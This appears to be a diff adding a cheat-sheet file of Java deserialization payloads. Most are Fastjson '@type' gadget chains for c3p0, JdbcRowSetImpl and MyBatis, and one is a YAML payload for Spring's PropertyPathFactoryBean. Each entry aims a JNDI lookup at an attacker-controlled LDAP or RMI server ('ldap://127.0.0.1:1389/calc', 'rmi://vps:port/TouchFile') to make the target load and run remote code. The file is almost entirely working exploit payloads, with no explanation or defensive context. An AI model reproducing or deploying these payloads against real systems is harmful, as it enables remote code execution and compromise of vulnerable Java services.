@@ -1,0 +1,24 @@
+//c3p0
+{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://127.0.0.1:1389/calc", "loginTimeout":0}
+
+//springframework
+String payload = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: \"rmi://127.0.0.1:1099/aa\", propertyPath: \"whatever\", beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: [\"rmi://127.0.0.1:1099/aa\"]}}";
+
+
+//tomcat
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://127.0.0.1:1099/#exp1",  #对应文件名不能变
+        "autoCommit":true
+    }
+}
+
+//mybatis
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://vps:port/TouchFile"}}
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"2333","initial_context":"rmi://ip:port/TouchFile"}}
+
